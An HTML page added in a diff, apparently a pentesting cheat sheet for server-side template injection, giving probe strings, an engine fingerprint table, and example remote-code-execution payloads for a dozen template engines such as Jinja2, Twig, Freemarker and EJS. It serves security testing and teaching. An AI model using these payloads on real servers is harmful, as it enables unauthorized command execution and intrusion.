@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SSTI Detection Cheatsheet</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow+Condensed:wght@300;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --surface: #111418;
+    --border: #1e2530;
+    --accent: #00e5ff;
+    --accent2: #ff4d6d;
+    --accent3: #b8ff57;
+    --text: #c9d4e0;
+    --muted: #4a5568;
+    --mono: 'Share Tech Mono', monospace;
+    --sans: 'Barlow Condensed', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 15px;
+    line-height: 1.5;
+    padding: 32px 24px;
+    max-width: 960px;
+    margin: 0 auto;
+  }
+
+  header {
+    border-left: 3px solid var(--accent);
+    padding-left: 16px;
+    margin-bottom: 32px;
+  }
+
+  header h1 {
+    font-size: 2.4rem;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #fff;
+    line-height: 1.1;
+  }
+
+  header p {
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: 0.78rem;
+    margin-top: 6px;
+    letter-spacing: 0.04em;
+  }
+
+  .tag {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 0.65rem;
+    padding: 2px 8px;
+    border-radius: 2px;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    margin-right: 4px;
+  }
+  .tag-step1 { background: #0d2d3a; color: var(--accent); border: 1px solid var(--accent); }
+  .tag-step2 { background: #2d1a24; color: var(--accent2); border: 1px solid var(--accent2); }
+  .tag-step3 { background: #1a2d0d; color: var(--accent3); border: 1px solid var(--accent3); }
+
+  section { margin-bottom: 28px; }
+
+  h2 {
+    font-size: 0.72rem;
+    font-family: var(--mono);
+    color: var(--accent);
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  h2::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* Detection Flow */
+  .flow {
+    display: flex;
+    gap: 0;
+    margin-bottom: 24px;
+    overflow-x: auto;
+  }
+
+  .flow-step {
+    flex: 1;
+    min-width: 160px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-right: none;
+    padding: 14px 16px;
+    position: relative;
+  }
+
+  .flow-step:last-child { border-right: 1px solid var(--border); }
+
+  .flow-step .num {
+    font-family: var(--mono);
+    font-size: 1.6rem;
+    font-weight: bold;
+    color: var(--border);
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+
+  .flow-step .title {
+    font-size: 0.88rem;
+    font-weight: 600;
+    color: #fff;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    margin-bottom: 6px;
+  }
+
+  .flow-step .desc {
+    font-size: 0.78rem;
+    color: var(--muted);
+    line-height: 1.4;
+  }
+
+  .flow-step code {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 0.75rem;
+    color: var(--accent3);
+    background: #0d1a00;
+    padding: 2px 6px;
+    border-radius: 2px;
+    margin-top: 4px;
+  }
+
+  /* Probe Table */
+  .probe-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 2px;
+    background: var(--border);
+    border: 1px solid var(--border);
+  }
+
+  .probe-header {
+    background: #0d1e2a;
+    padding: 8px 12px;
+    font-family: var(--mono);
+    font-size: 0.68rem;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+  }
+
+  .probe-row {
+    display: contents;
+  }
+
+  .probe-cell {
+    background: var(--surface);
+    padding: 10px 14px;
+    font-size: 0.82rem;
+  }
+
+  .probe-cell.label {
+    color: #fff;
+    font-weight: 600;
+    font-size: 0.8rem;
+    letter-spacing: 0.04em;
+  }
+
+  .probe-cell code {
+    font-family: var(--mono);
+    font-size: 0.75rem;
+    color: var(--accent3);
+  }
+
+  .probe-cell .response {
+    font-family: var(--mono);
+    font-size: 0.72rem;
+    color: var(--accent2);
+    margin-top: 3px;
+  }
+
+  /* Engine table */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.82rem;
+  }
+
+  th {
+    background: #0d1e2a;
+    font-family: var(--mono);
+    font-size: 0.65rem;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 9px 12px;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+
+  td {
+    padding: 9px 12px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+  }
+
+  tr:last-child td { border-bottom: none; }
+
+  tr:nth-child(even) td { background: #0d1014; }
+
+  td code {
+    font-family: var(--mono);
+    font-size: 0.73rem;
+    color: var(--accent3);
+    background: #0d1a00;
+    padding: 1px 5px;
+    border-radius: 2px;
+  }
+
+  .lang-badge {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 0.62rem;
+    padding: 2px 7px;
+    border-radius: 2px;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+  }
+
+  .py { background: #1a1a00; color: #ffd700; border: 1px solid #3a3a00; }
+  .rb { background: #2a0a0a; color: #ff6b6b; border: 1px solid #4a1a1a; }
+  .js { background: #1a1500; color: #f0db4f; border: 1px solid #3a3000; }
+  .java { background: #0a1a2a; color: #6db3f2; border: 1px solid #1a3a5a; }
+  .php { background: #1a0a2a; color: #c197f5; border: 1px solid #3a1a5a; }
+  .go  { background: #0a1a1a; color: #00e5ff; border: 1px solid #0a3535; }
+
+  .hint-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent2);
+    padding: 12px 16px;
+    font-size: 0.82rem;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px 24px;
+  }
+
+  .hint-box .hint-item {
+    display: flex;
+    gap: 8px;
+  }
+
+  .hint-box .hint-item span:first-child {
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    color: var(--accent2);
+    min-width: 60px;
+    padding-top: 1px;
+  }
+
+  .hint-box .hint-item span:last-child {
+    color: var(--text);
+    font-size: 0.8rem;
+  }
+
+  footer {
+    margin-top: 32px;
+    padding-top: 16px;
+    border-top: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 0.65rem;
+    color: var(--muted);
+    letter-spacing: 0.06em;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>SSTI Detection<br>Cheatsheet</h1>
+  <p>// server-side template injection — engine fingerprinting &amp; probing</p>
+</header>
+
+<!-- STEP 1: Detection Flow -->
+<section>
+  <h2>Detection workflow</h2>
+  <div class="flow">
+    <div class="flow-step">
+      <div class="num">01</div>
+      <div class="title">Find Injection Points</div>
+      <div class="desc">URL params, form fields, headers, cookies — anywhere user input is reflected in the response.</div>
+    </div>
+    <div class="flow-step">
+      <div class="num">02</div>
+      <div class="title">Confirm Injection</div>
+      <div class="desc">Send a math probe. If the server evaluates it, you have SSTI.<br><code>{{7*7}} → 49?</code></div>
+    </div>
+    <div class="flow-step">
+      <div class="num">03</div>
+      <div class="title">Fingerprint Engine</div>
+      <div class="desc">Use syntax-specific probes to narrow down which engine is running.</div>
+    </div>
+    <div class="flow-step">
+      <div class="num">04</div>
+      <div class="title">Exploit</div>
+      <div class="desc">Use engine-specific payloads to read files, env vars, or achieve RCE.</div>
+    </div>
+  </div>
+</section>
+
+<!-- STEP 2: Polyglot / First Probes -->
+<section>
+  <h2>Initial polyglot probes</h2>
+  <div class="probe-grid">
+    <div class="probe-header">Payload</div>
+    <div class="probe-header">What it tells you</div>
+
+    <div class="probe-row">
+      <div class="probe-cell"><code>{{7*7}}</code></div>
+      <div class="probe-cell">Jinja2, Twig, or similar Mustache-style engine — evaluates if output is <span class="response">49</span></div>
+    </div>
+    <div class="probe-row">
+      <div class="probe-cell"><code>${7*7}</code></div>
+      <div class="probe-cell">Freemarker, Smarty, or Tornado — evaluates if output is <span class="response">49</span></div>
+    </div>
+    <div class="probe-row">
+      <div class="probe-cell"><code>&lt;%= 7*7 %&gt;</code></div>
+      <div class="probe-cell">ERB (Ruby), EJS (Node.js) — evaluates if output is <span class="response">49</span></div>
+    </div>
+    <div class="probe-row">
+      <div class="probe-cell"><code>#{7*7}</code></div>
+      <div class="probe-cell">Ruby (ERB interpolation) or Slim — evaluates if output is <span class="response">49</span></div>
+    </div>
+    <div class="probe-row">
+      <div class="probe-cell"><code>{{7*'7'}}</code></div>
+      <div class="probe-cell">Distinguishes Jinja2 (<span class="response">7777777</span>) from Twig (<span class="response">49</span>)</div>
+    </div>
+    <div class="probe-row">
+      <div class="probe-cell"><code>@(7*7)</code></div>
+      <div class="probe-cell">Razor (.NET) — evaluates if output is <span class="response">49</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- STEP 3: Engine Fingerprint Table -->
+<section>
+  <h2>Engine fingerprint map</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Engine</th>
+        <th>Language</th>
+        <th>Syntax probe</th>
+        <th>Expected output</th>
+        <th>RCE payload (example)</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Jinja2</strong></td>
+        <td><span class="lang-badge py">Python</span></td>
+        <td><code>{{7*'7'}}</code></td>
+        <td><code>7777777</code></td>
+        <td><code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code></td>
+      </tr>
+      <tr>
+        <td><strong>Tornado</strong></td>
+        <td><span class="lang-badge py">Python</span></td>
+        <td><code>{%raw%}{{7*7}}{%endraw%}</code> / import test</td>
+        <td><code>49</code></td>
+        <td><code>{%import os%}{{os.popen('id').read()}}</code></td>
+      </tr>
+      <tr>
+        <td><strong>Mako</strong></td>
+        <td><span class="lang-badge py">Python</span></td>
+        <td><code>${7*7}</code></td>
+        <td><code>49</code></td>
+        <td><code>${__import__('os').popen('id').read()}</code></td>
+      </tr>
+      <tr>
+        <td><strong>ERB</strong></td>
+        <td><span class="lang-badge rb">Ruby</span></td>
+        <td><code>&lt;%= 7*7 %&gt;</code></td>
+        <td><code>49</code></td>
+        <td><code>&lt;%= `id` %&gt;</code></td>
+      </tr>
+      <tr>
+        <td><strong>Slim</strong></td>
+        <td><span class="lang-badge rb">Ruby</span></td>
+        <td><code>#{7*7}</code></td>
+        <td><code>49</code></td>
+        <td><code>#{`id`}</code></td>
+      </tr>
+      <tr>
+        <td><strong>Twig</strong></td>
+        <td><span class="lang-badge php">PHP</span></td>
+        <td><code>{{7*7}}</code></td>
+        <td><code>49</code></td>
+        <td><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></td>
+      </tr>
+      <tr>
+        <td><strong>Smarty</strong></td>
+        <td><span class="lang-badge php">PHP</span></td>
+        <td><code>{$smarty.version}</code></td>
+        <td>version string</td>
+        <td><code>{php}echo `id`;{/php}</code></td>
+      </tr>
+      <tr>
+        <td><strong>Freemarker</strong></td>
+        <td><span class="lang-badge java">Java</span></td>
+        <td><code>${7*7}</code></td>
+        <td><code>49</code></td>
+        <td><code>${"freemarker.template.utility.Execute"?new()("id")}</code></td>
+      </tr>
+      <tr>
+        <td><strong>Velocity</strong></td>
+        <td><span class="lang-badge java">Java</span></td>
+        <td><code>#set($x=7*7)${x}</code></td>
+        <td><code>49</code></td>
+        <td><code>#set($e="")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)</code></td>
+      </tr>
+      <tr>
+        <td><strong>Pebble</strong></td>
+        <td><span class="lang-badge java">Java</span></td>
+        <td><code>{{7*7}}</code></td>
+        <td><code>49</code></td>
+        <td><code>{% for i in "".class.forName("java.lang.Runtime")... %}</code></td>
+      </tr>
+      <tr>
+        <td><strong>EJS</strong></td>
+        <td><span class="lang-badge js">Node.js</span></td>
+        <td><code>&lt;%= 7*7 %&gt;</code></td>
+        <td><code>49</code></td>
+        <td><code>&lt;%= require('child_process').execSync('id') %&gt;</code></td>
+      </tr>
+      <tr>
+        <td><strong>Pug / Jade</strong></td>
+        <td><span class="lang-badge js">Node.js</span></td>
+        <td><code>#{7*7}</code></td>
+        <td><code>49</code></td>
+        <td><code>- var x = require('child_process').execSync('id')\n= x</code></td>
+      </tr>
+      <tr>
+        <td><strong>Razor</strong></td>
+        <td><span class="lang-badge go">.NET</span></td>
+        <td><code>@(7*7)</code></td>
+        <td><code>49</code></td>
+        <td><code>@System.Diagnostics.Process.Start("cmd.exe","/c id")</code></td>
+      </tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- Passive hints -->
+<section>
+  <h2>Passive fingerprinting hints</h2>
+  <div class="hint-box">
+    <div class="hint-item"><span>Headers</span><span><code>X-Powered-By</code>, <code>Server</code> headers may leak framework (e.g. Express, Rails, Django)</span></div>
+    <div class="hint-item"><span>Cookies</span><span>Session cookie names: <code>JSESSIONID</code> → Java, <code>PHPSESSID</code> → PHP, <code>rack.session</code> → Ruby</span></div>
+    <div class="hint-item"><span>Extensions</span><span><code>.jsp</code> → Java, <code>.erb</code> → Ruby, <code>.twig</code> → PHP, <code>.j2</code> → Jinja2</span></div>
+    <div class="hint-item"><span>Errors</span><span>Verbose error messages often include stack traces naming the template engine directly</span></div>
+    <div class="hint-item"><span>Wappalyzer</span><span>Browser extension that passively detects tech stack from response characteristics</span></div>
+    <div class="hint-item"><span>whatweb</span><span>CLI tool: <code>whatweb target.com</code> — identifies CMS, framework, server</span></div>
+  </div>
+</section>
+
+<footer>SSTI DETECTION CHEATSHEET — for authorized penetration testing only</footer>
+
+</body>
+</html>
